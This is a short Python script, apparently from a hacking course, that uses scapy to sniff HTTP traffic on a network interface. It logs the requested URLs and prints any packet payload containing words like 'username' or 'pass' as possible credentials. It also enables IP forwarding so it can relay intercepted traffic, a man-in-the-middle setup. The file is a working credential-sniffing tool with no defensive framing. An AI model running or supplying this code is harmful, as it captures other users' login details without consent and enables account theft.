import os

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface is basically specifies the interface that you want this function to sniff on
    # store : if you don't want to store packet in memory
    # prn : every packet that you sniff or for every piece of data that u sniff , I want u to call another function
    # filter : filter the data have string in ""
    # example : port 20: FTP passwords
    # port 80: data send to webserver


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "passwords", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # method that's implemented by Scapy that checks if this packet has data that is being
    # sent over the layer that we specify in here, so we can give any layer we want.
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
sniff("eth0")
